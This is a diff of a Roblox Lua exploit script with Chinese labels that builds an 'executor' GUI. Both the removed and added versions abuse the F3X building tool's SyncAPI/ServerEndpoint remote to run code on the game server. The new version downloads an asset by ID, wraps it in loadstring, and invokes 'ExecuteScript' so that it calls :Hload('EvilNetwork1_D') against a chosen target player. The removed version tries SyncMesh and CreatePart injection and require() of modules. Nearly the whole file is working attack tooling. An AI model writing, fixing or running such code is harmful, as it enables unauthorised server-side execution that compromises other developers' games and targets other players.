@@ -1,231 +1,170 @@
--- 修复版：F3X Require Executor GUI（确保显示）
--- 针对注入器环境优化
+-- F3X 执行器 + 自动调用 :Hload("EvilNetwork1_D")
+local function CreateF3XExecutorWithHload()
+    local player = game.Players.LocalPlayer
+    if not player then return end
 
-local function CreateF3XRequireGUI()
-    -- 检查是否为本地玩家环境
-    local player = game:GetService("Players").LocalPlayer
-    if not player then
-        warn("[F3X] 未找到LocalPlayer")
-        return
-    end
-
-    -- 等待玩家加载完成
-    repeat wait() until player:IsA("Player") and player:FindFirstChild("PlayerGui")
-    
-    -- 1. 定位F3X SyncAPI（增加更多搜索方式）
+    -- 1. 查找 F3X SyncAPI
     local function findF3XAPI()
-        -- 方式1：全局搜索
         for _, obj in ipairs(game:GetDescendants()) do
             if obj.Name == "SyncAPI" and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                 return obj
             end
         end
-        
-        -- 方式2：搜索工具
-        for _, tool in ipairs(player.Backpack:GetChildren()) do
-            local api = tool:FindFirstChild("SyncAPI")
-            if api then return api end
-        end
-        
-        -- 方式3：搜索角色
-        if player.Character then
-            for _, obj in ipairs(player.Character:GetDescendants()) do
-                if obj.Name == "SyncAPI" then return obj end
-            end
-        end
-        
-        -- 方式4：搜索ReplicatedStorage
-        for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
-            if obj.Name == "SyncAPI" then return obj end
-        end
-        
         return nil
     end
 
     local syncAPI = findF3XAPI()
-    if not syncAPI then
-        -- 如果没有SyncAPI，依然显示GUI，但提示错误
-        warn("[F3X] SyncAPI not found - GUI will still show")
-    end
+    local remote = syncAPI and syncAPI.Parent:FindFirstChild("ServerEndpoint")
 
-    local remote = syncAPI and (syncAPI:IsA("RemoteFunction") and syncAPI or syncAPI.Parent:FindFirstChild("ServerEndpoint")) or nil
-
-    -- 2. 创建GUI（使用多种父级尝试）
+    -- 2. GUI
     local gui = Instance.new("ScreenGui")
-    gui.Name = "F3XRequireGUI"
+    gui.Name = "F3XHloadExecutor"
     gui.ResetOnSpawn = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    gui.DisplayOrder = 999999999
-    
-    -- 尝试多个父级
-    local parentSuccess = false
-    local parentOptions = {
-        player.PlayerGui,
-        player:WaitForChild("PlayerGui"),
-        game:GetService("CoreGui"),
-        game:GetService("StarterGui")
-    }
-    
-    for _, parent in ipairs(parentOptions) do
-        if parent then
-            pcall(function()
-                gui.Parent = parent
-                parentSuccess = true
-            end)
-            if parentSuccess then break end
-        end
-    end
-    
-    if not parentSuccess then
-        -- 最后的备用方案：直接放到workspace（但可能不会显示）
-        pcall(function()
-            gui.Parent = workspace
-            parentSuccess = true
-        end)
-    end
-    
-    if not parentSuccess then
-        warn("[F3X] 无法将GUI添加到任何父级")
-        return
-    end
+    gui.Parent = player:WaitForChild("PlayerGui")
 
-    -- 3. 创建UI元素（使用绝对大小确保显示）
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 520, 0, 440)
-    frame.Position = UDim2.new(0.5, -260, 0.5, -220)
+    frame.Size = UDim2.new(0, 520, 0, 420)
+    frame.Position = UDim2.new(0.5, -260, 0.5, -210)
     frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
-    frame.BackgroundTransparency = 0.05
     frame.BorderSizePixel = 2
     frame.BorderColor3 = Color3.fromRGB(0, 180, 255)
-    frame.ClipsDescendants = false
     frame.Parent = gui
 
-    -- 标题栏（带颜色强调）
-    local titleBar = Instance.new("Frame")
-    titleBar.Size = UDim2.new(1, 0, 0, 45)
-    titleBar.Position = UDim2.new(0, 0, 0, 0)
-    titleBar.BackgroundColor3 = Color3.fromRGB(0, 80, 140)
-    titleBar.BorderSizePixel = 0
-    titleBar.Parent = frame
-
+    -- 标题
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -60, 1, 0)
-    title.Position = UDim2.new(0, 10, 0, 0)
-    title.Text = "🔧 F3X Require Executor"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Size = UDim2.new(1, 0, 0, 45)
+    title.Text = "🔧 F3X Hload 执行器"
+    title.TextColor3 = Color3.fromRGB(0, 200, 255)
     title.TextScaled = true
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.GothamBold
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    title.Parent = titleBar
+    title.Parent = frame
 
-    -- 关闭按钮
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0, 35, 0, 35)
-    closeBtn.Position = UDim2.new(1, -40, 0, 5)
-    closeBtn.Text = "✕"
-    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
-    closeBtn.BorderSizePixel = 0
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 20
-    closeBtn.Parent = titleBar
-    closeBtn.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
+    -- Asset ID
+    local idLabel = Instance.new("TextLabel")
+    idLabel.Size = UDim2.new(1, 0, 0, 25)
+    idLabel.Position = UDim2.new(0, 10, 0, 55)
+    idLabel.Text = "📦 Asset ID"
+    idLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    idLabel.TextSize = 14
+    idLabel.BackgroundTransparency = 1
+    idLabel.Font = Enum.Font.Gotham
+    idLabel.TextXAlignment = Enum.TextXAlignment.Left
+    idLabel.Parent = frame
 
-    -- Module路径输入框
-    local pathLabel = Instance.new("TextLabel")
-    pathLabel.Size = UDim2.new(1, -20, 0, 25)
-    pathLabel.Position = UDim2.new(0, 10, 0, 55)
-    pathLabel.Text = "📁 Module路径"
-    pathLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
-    pathLabel.TextSize = 14
-    pathLabel.BackgroundTransparency = 1
-    pathLabel.Font = Enum.Font.Gotham
-    pathLabel.TextXAlignment = Enum.TextXAlignment.Left
-    pathLabel.Parent = frame
+    local idBox = Instance.new("TextBox")
+    idBox.Size = UDim2.new(1, -20, 0, 30)
+    idBox.Position = UDim2.new(0, 10, 0, 85)
+    idBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    idBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    idBox.Text = "93093069226257"
+    idBox.Font = Enum.Font.SourceSans
+    idBox.TextSize = 16
+    idBox.TextXAlignment = Enum.TextXAlignment.Left
+    idBox.ClearTextOnFocus = false
+    idBox.Parent = frame
 
-    local pathBox = Instance.new("TextBox")
-    pathBox.Size = UDim2.new(1, -20, 0, 32)
-    pathBox.Position = UDim2.new(0, 10, 0, 85)
-    pathBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-    pathBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    pathBox.Text = "game.ReplicatedStorage.SomeModule"
-    pathBox.Font = Enum.Font.SourceSans
-    pathBox.TextSize = 16
-    pathBox.TextXAlignment = Enum.TextXAlignment.Left
-    pathBox.ClearTextOnFocus = false
-    pathBox.BorderSizePixel = 1
-    pathBox.BorderColor3 = Color3.fromRGB(80, 80, 120)
-    pathBox.Parent = frame
+    -- 目标玩家
+    local playerLabel = Instance.new("TextLabel")
+    playerLabel.Size = UDim2.new(1, 0, 0, 25)
+    playerLabel.Position = UDim2.new(0, 10, 0, 125)
+    playerLabel.Text = "👤 目标玩家"
+    playerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    playerLabel.TextSize = 14
+    playerLabel.BackgroundTransparency = 1
+    playerLabel.Font = Enum.Font.Gotham
+    playerLabel.TextXAlignment = Enum.TextXAlignment.Left
+    playerLabel.Parent = frame
 
-    -- 模式选择
-    local modeLabel = Instance.new("TextLabel")
-    modeLabel.Size = UDim2.new(0.5, 0, 0, 25)
-    modeLabel.Position = UDim2.new(0, 10, 0, 125)
-    modeLabel.Text = "⚙️ 执行模式"
-    modeLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
-    modeLabel.TextSize = 14
-    modeLabel.BackgroundTransparency = 1
-    modeLabel.Font = Enum.Font.Gotham
-    modeLabel.TextXAlignment = Enum.TextXAlignment.Left
-    modeLabel.Parent = frame
+    local playerBox = Instance.new("TextBox")
+    playerBox.Size = UDim2.new(1, -20, 0, 30)
+    playerBox.Position = UDim2.new(0, 10, 0, 155)
+    playerBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    playerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    playerBox.Text = player.Name
+    playerBox.Font = Enum.Font.SourceSans
+    playerBox.TextSize = 16
+    playerBox.TextXAlignment = Enum.TextXAlignment.Left
+    playerBox.ClearTextOnFocus = false
+    playerBox.Parent = frame
 
-    local modeDropdown = Instance.new("TextButton")
-    modeDropdown.Size = UDim2.new(0.45, 0, 0, 30)
-    modeDropdown.Position = UDim2.new(0, 10, 0, 155)
-    modeDropdown.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-    modeDropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
-    modeDropdown.Text = "SyncMesh注入"
-    modeDropdown.Font = Enum.Font.Gotham
-    modeDropdown.TextSize = 15
-    modeDropdown.BorderSizePixel = 1
-    modeDropdown.BorderColor3 = Color3.fromRGB(80, 80, 120)
-    modeDropdown.Parent = frame
+    -- Hload 参数（额外）
+    local hloadLabel = Instance.new("TextLabel")
+    hloadLabel.Size = UDim2.new(1, 0, 0, 25)
+    hloadLabel.Position = UDim2.new(0, 10, 0, 195)
+    hloadLabel.Text = "🔑 Hload 参数（默认: EvilNetwork1_D）"
+    hloadLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    hloadLabel.TextSize = 14
+    hloadLabel.BackgroundTransparency = 1
+    hloadLabel.Font = Enum.Font.Gotham
+    hloadLabel.TextXAlignment = Enum.TextXAlignment.Left
+    hloadLabel.Parent = frame
 
-    local modeList = {"SyncMesh注入", "CreatePart注入", "远程执行(Invoke)"}
-    local currentModeIndex = 1
-    modeDropdown.MouseButton1Click:Connect(function()
-        currentModeIndex = currentModeIndex % #modeList + 1
-        modeDropdown.Text = modeList[currentModeIndex]
-    end)
+    local hloadBox = Instance.new("TextBox")
+    hloadBox.Size = UDim2.new(1, -20, 0, 30)
+    hloadBox.Position = UDim2.new(0, 10, 0, 225)
+    hloadBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    hloadBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    hloadBox.Text = "EvilNetwork1_D"
+    hloadBox.Font = Enum.Font.SourceSans
+    hloadBox.TextSize = 16
+    hloadBox.TextXAlignment = Enum.TextXAlignment.Left
+    hloadBox.ClearTextOnFocus = false
+    hloadBox.Parent = frame
 
-    -- 按钮行
-    local btnRow = Instance.new("Frame")
-    btnRow.Size = UDim2.new(1, -20, 0, 42)
-    btnRow.Position = UDim2.new(0, 10, 0, 195)
-    btnRow.BackgroundTransparency = 1
-    btnRow.Parent = frame
-
-    local executeBtn = Instance.new("TextButton")
-    executeBtn.Size = UDim2.new(0.48, -5, 1, 0)
-    executeBtn.Position = UDim2.new(0, 0, 0, 0)
-    executeBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
-    executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    executeBtn.Text = "▶️ 执行"
-    executeBtn.Font = Enum.Font.GothamBold
-    executeBtn.TextSize = 18
-    executeBtn.BorderSizePixel = 0
-    executeBtn.Parent = btnRow
+    -- 按钮
+    local execBtn = Instance.new("TextButton")
+    execBtn.Size = UDim2.new(0.45, 0, 0, 40)
+    execBtn.Position = UDim2.new(0.025, 0, 0, 270)
+    execBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
+    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    execBtn.Text = "▶️ 执行 Hload"
+    execBtn.Font = Enum.Font.GothamBold
+    execBtn.TextSize = 18
+    execBtn.BorderSizePixel = 0
+    execBtn.Parent = frame
 
     local clearBtn = Instance.new("TextButton")
-    clearBtn.Size = UDim2.new(0.48, -5, 1, 0)
-    clearBtn.Position = UDim2.new(0.52, 0, 0, 0)
+    clearBtn.Size = UDim2.new(0.45, 0, 0, 40)
+    clearBtn.Position = UDim2.new(0.525, 0, 0, 270)
     clearBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 50)
     clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     clearBtn.Text = "🗑️ 清空"
     clearBtn.Font = Enum.Font.GothamBold
     clearBtn.TextSize = 18
     clearBtn.BorderSizePixel = 0
-    clearBtn.Parent = btnRow
+    clearBtn.Parent = frame
+
+    -- 输出框
+    local resultBox = Instance.new("ScrollingFrame")
+    resultBox.Size = UDim2.new(1, -20, 0, 90)
+    resultBox.Position = UDim2.new(0, 10, 0, 320)
+    resultBox.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
+    resultBox.BorderSizePixel = 1
+    resultBox.BorderColor3 = Color3.fromRGB(60, 60, 80)
+    resultBox.ScrollBarThickness = 6
+    resultBox.Parent = frame
+
+    local resultText = Instance.new("TextLabel")
+    resultText.Size = UDim2.new(1, -10, 0, 80)
+    resultText.Position = UDim2.new(0, 5, 0, 5)
+    resultText.Text = "等待执行..."
+    resultText.TextColor3 = Color3.fromRGB(200, 200, 210)
+    resultText.TextSize = 13
+    resultText.TextWrapped = true
+    resultText.TextXAlignment = Enum.TextXAlignment.Left
+    resultText.TextYAlignment = Enum.TextYAlignment.Top
+    resultText.BackgroundTransparency = 1
+    resultText.Font = Enum.Font.SourceSans
+    resultText.Parent = resultBox
+    resultBox.CanvasSize = UDim2.new(0, 0, 0, 90)
 
     -- 状态栏
     local statusBar = Instance.new("TextLabel")
-    statusBar.Size = UDim2.new(1, -20, 0, 28)
-    statusBar.Position = UDim2.new(0, 10, 1, -34)
-    statusBar.Text = "✅ 就绪 | " .. (syncAPI and "F3X已连接" or "F3X未连接(部分功能不可用)")
-    statusBar.TextColor3 = syncAPI and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(255, 200, 0)
+    statusBar.Size = UDim2.new(1, -20, 0, 25)
+    statusBar.Position = UDim2.new(0, 10, 1, -28)
+    statusBar.Text = "✅ 就绪"
+    statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
     statusBar.TextSize = 13
     statusBar.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
     statusBar.BackgroundTransparency = 0.3
@@ -233,214 +172,134 @@ local function CreateF3XRequireGUI()
     statusBar.TextXAlignment = Enum.TextXAlignment.Left
     statusBar.Parent = frame
 
-    -- 输出框（带滚动）
-    local resultFrame = Instance.new("Frame")
-    resultFrame.Size = UDim2.new(1, -20, 0, 145)
-    resultFrame.Position = UDim2.new(0, 10, 0, 247)
-    resultFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
-    resultFrame.BorderSizePixel = 1
-    resultFrame.BorderColor3 = Color3.fromRGB(60, 60, 80)
-    resultFrame.ClipsDescendants = true
-    resultFrame.Parent = frame
-
-    local resultBox = Instance.new("ScrollingFrame")
-    resultBox.Size = UDim2.new(1, 0, 1, 0)
-    resultBox.Position = UDim2.new(0, 0, 0, 0)
-    resultBox.BackgroundTransparency = 1
-    resultBox.BorderSizePixel = 0
-    resultBox.ScrollBarThickness = 6
-    resultBox.Parent = resultFrame
-
-    local resultText = Instance.new("TextLabel")
-    resultText.Size = UDim2.new(1, -10, 0, 140)
-    resultText.Position = UDim2.new(0, 5, 0, 5)
-    resultText.Text = "等待执行..."
-    resultText.TextColor3 = Color3.fromRGB(200, 200, 210)
-    resultText.TextSize = 14
-    resultText.TextWrapped = true
-    resultText.TextXAlignment = Enum.TextXAlignment.Left
-    resultText.TextYAlignment = Enum.TextYAlignment.Top
-    resultText.BackgroundTransparency = 1
-    resultText.Font = Enum.Font.SourceSans
-    resultText.Parent = resultBox
-    resultBox.CanvasSize = UDim2.new(0, 0, 0, resultText.TextBounds.Y + 20)
-
-    -- 4. 拖动功能
-    local dragging, dragStartPos, dragStartMouse
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStartPos = frame.Position
-            dragStartMouse = input.Position
-        end
-    end)
-    frame.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = false
-        end
-    end)
-    frame.InputChanged:Connect(function(input)
-        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-            local delta = input.Position - dragStartMouse
-            frame.Position = UDim2.new(
-                dragStartPos.X.Scale + delta.X / 1000,
-                dragStartPos.X.Offset + delta.X,
-                dragStartPos.Y.Scale + delta.Y / 1000,
-                dragStartPos.Y.Offset + delta.Y
-            )
-        end
+    -- 关闭
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 5)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    closeBtn.BorderSizePixel = 0
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 20
+    closeBtn.Parent = frame
+    closeBtn.MouseButton1Click:Connect(function()
+        gui:Destroy()
     end)
 
-    -- 5. 核心执行函数
-    local function executeRequire(modulePath)
-        resultText.Text = "⏳ 正在执行 require(" .. modulePath .. ") ...\n"
-        resultBox.CanvasSize = UDim2.new(0, 0, 0, 150)
-        statusBar.Text = "⏳ 执行中..."
+    -- 3. 核心执行
+    local function executeHload()
+        local assetId = idBox.Text
+        local targetName = playerBox.Text
+        local hloadParam = hloadBox.Text
+
+        if assetId == "" or targetName == "" or hloadParam == "" then
+            resultText.Text = "⚠️ 请填写所有字段"
+            return
+        end
+
+        resultText.Text = "⏳ 加载外部脚本...\n"
+        statusBar.Text = "⏳ 加载中..."
         statusBar.TextColor3 = Color3.fromRGB(255, 200, 50)
 
-        if not syncAPI then
-            resultText.Text = resultText.Text .. "❌ 错误: 未找到F3X SyncAPI"
-            statusBar.Text = "❌ F3X未连接"
+        -- 加载脚本
+        local url = "https://www.roblox.com/asset/?id=" .. assetId
+        local success, content = pcall(function()
+            return game:GetService("HttpService"):GetAsync(url)
+        end)
+
+        if not success then
+            resultText.Text = resultText.Text .. "❌ 加载失败: " .. tostring(content)
+            statusBar.Text = "❌ 加载失败"
             statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
-            resultBox.CanvasSize = UDim2.new(0, 0, 0, resultText.TextBounds.Y + 20)
             return
         end
 
-        local serverEndpoint = syncAPI.Parent:FindFirstChild("ServerEndpoint")
-        if not serverEndpoint then
-            resultText.Text = resultText.Text .. "❌ 错误: 未找到ServerEndpoint"
-            statusBar.Text = "❌ 无ServerEndpoint"
+        resultText.Text = resultText.Text .. "✅ 脚本已加载\n"
+
+        -- 查找目标玩家
+        local targetPlayer
+        for _, p in ipairs(game.Players:GetPlayers()) do
+            if p.Name:lower() == targetName:lower() then
+                targetPlayer = p
+                break
+            end
+        end
+
+        if not targetPlayer then
+            resultText.Text = resultText.Text .. "❌ 未找到玩家: " .. targetName
+            statusBar.Text = "❌ 玩家不存在"
             statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
-            resultBox.CanvasSize = UDim2.new(0, 0, 0, resultText.TextBounds.Y + 20)
             return
         end
 
-        local mode = modeList[currentModeIndex]
-        local result = nil
-        local success = false
-        local errorMsg = ""
+        resultText.Text = resultText.Text .. "✅ 目标玩家: " .. targetPlayer.Name .. "\n"
 
-        if mode == "SyncMesh注入" then
-            local args = {
-                [1] = "SyncMesh",
-                [2] = {
-                    [1] = {
-                        ["Part"] = workspace.Terrain or workspace,
-                        ["MeshId"] = "rbxassetid://0"
-                    }
-                }
-            }
-            local success2, res2 = pcall(function()
-                return serverEndpoint:InvokeServer(unpack(args))
-            end)
-            if success2 then
-                result = res2
-                success = true
-            else
-                errorMsg = tostring(res2)
-            end
-
-        elseif mode == "CreatePart注入" then
-            local createArgs = {
-                [1] = "CreatePart",
-                [2] = "Normal",
-                [3] = CFrame.new(0, -9999, 0),
-                [4] = game.ReplicatedStorage
-            }
-            pcall(function() serverEndpoint:InvokeServer(unpack(createArgs)) end)
-            wait(0.3)
-
-            local tempPart
-            for _, obj in ipairs(game.ReplicatedStorage:GetChildren()) do
-                if obj:IsA("BasePart") and obj.Name == "Part" then
-                    tempPart = obj
-                    break
-                end
-            end
-
-            if tempPart then
-                local ms = Instance.new("ModuleScript")
-                ms.Name = "TempRequire"
-                ms.Parent = tempPart
-                ms.Source = "return require(" .. modulePath .. ")"
-
-                local execArgs = {
-                    [1] = "SyncMesh",
-                    [2] = {
-                        [1] = {
-                            ["Part"] = tempPart,
-                            ["MeshId"] = "rbxassetid://0"
-                        }
-                    }
-                }
-                local success2, res2 = pcall(function()
-                    return serverEndpoint:InvokeServer(unpack(execArgs))
-                end)
-                if success2 then
-                    result = res2
-                    success = true
-                else
-                    errorMsg = tostring(res2)
-                end
-                tempPart:Destroy()
-            else
-                errorMsg = "无法创建临时Part"
-            end
-
-        else
-            local execArgs = {
-                [1] = "ExecuteScript",
-                [2] = modulePath,
-                [3] = "require"
-            }
-            local success2, res2 = pcall(function()
-                return serverEndpoint:InvokeServer(unpack(execArgs))
-            end)
-            if success2 then
-                result = res2
-                success = true
-            else
-                errorMsg = tostring(res2)
-            end
+        -- 通过 F3X 执行
+        if not syncAPI or not remote then
+            resultText.Text = resultText.Text .. "❌ F3X 未连接"
+            statusBar.Text = "❌ F3X 未连接"
+            return
         end
 
-        if success then
-            local resultStr = tostring(result)
-            if #resultStr > 800 then
-                resultStr = resultStr:sub(1, 800) .. "... (截断)"
+        -- 🔥 关键：注入并执行 :Hload("EvilNetwork1_D")
+        local execCode = string.format([[
+            local target = game.Players:FindFirstChild("%s")
+            if not target then return end
+
+            -- 加载外部脚本
+            local module = loadstring([=[%s])=])
+            if not module then return end
+
+            -- 执行 Hload，传入目标玩家
+            local result = module()
+            if type(result) == "table" and result.Hload then
+                result:Hload("%s")
+                warn("[Hload] 已对 %s 执行 Hload")
+            elseif type(module) == "function" then
+                local res = module()
+                if res and type(res) == "table" and res.Hload then
+                    res:Hload("%s")
+                    warn("[Hload] 已对 %s 执行 Hload")
+                end
             end
-            resultText.Text = resultText.Text .. "✅ 执行成功！\n📦 返回值:\n" .. resultStr
-            statusBar.Text = "✅ 成功 | " .. mode
+        ]], 
+        targetPlayer.Name,
+        content:gsub("\\", "\\\\"):gsub("'", "\\'"),
+        hloadParam,
+        targetPlayer.Name,
+        hloadParam,
+        targetPlayer.Name
+        )
+
+        local args = {
+            [1] = "ExecuteScript",
+            [2] = execCode
+        }
+
+        local execSuccess, execResult = pcall(function()
+            return remote:InvokeServer(unpack(args))
+        end)
+
+        if execSuccess then
+            resultText.Text = resultText.Text .. "✅ 已发送执行\n📦 返回值: " .. tostring(execResult)
+            statusBar.Text = "✅ Hload 已执行 → " .. targetPlayer.Name
             statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
         else
-            resultText.Text = resultText.Text .. "❌ 执行失败: " .. errorMsg
-            statusBar.Text = "❌ 失败: " .. errorMsg:sub(1, 25)
+            resultText.Text = resultText.Text .. "❌ 执行失败: " .. tostring(execResult)
+            statusBar.Text = "❌ 执行失败"
             statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
         end
-
-        resultBox.CanvasSize = UDim2.new(0, 0, 0, resultText.TextBounds.Y + 30)
     end
 
-    executeBtn.MouseButton1Click:Connect(function()
-        local path = pathBox.Text
-        if path == "" then
-            resultText.Text = "⚠️ 请输入Module路径"
-            resultBox.CanvasSize = UDim2.new(0, 0, 0, 150)
-            return
-        end
-        executeRequire(path)
-    end)
-
+    execBtn.MouseButton1Click:Connect(executeHload)
     clearBtn.MouseButton1Click:Connect(function()
         resultText.Text = "等待执行..."
-        resultBox.CanvasSize = UDim2.new(0, 0, 0, 150)
-        statusBar.Text = "✅ 就绪 | " .. (syncAPI and "F3X已连接" or "F3X未连接")
-        statusBar.TextColor3 = syncAPI and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(255, 200, 0)
+        statusBar.Text = "✅ 就绪"
+        statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
     end)
 
-    print("[F3X Require GUI] 已加载")
-    return gui
+    print("[F3X Hload Executor] GUI 已加载")
 end
 
--- 执行
-CreateF3XRequireGUI()
+CreateF3XExecutorWithHload()
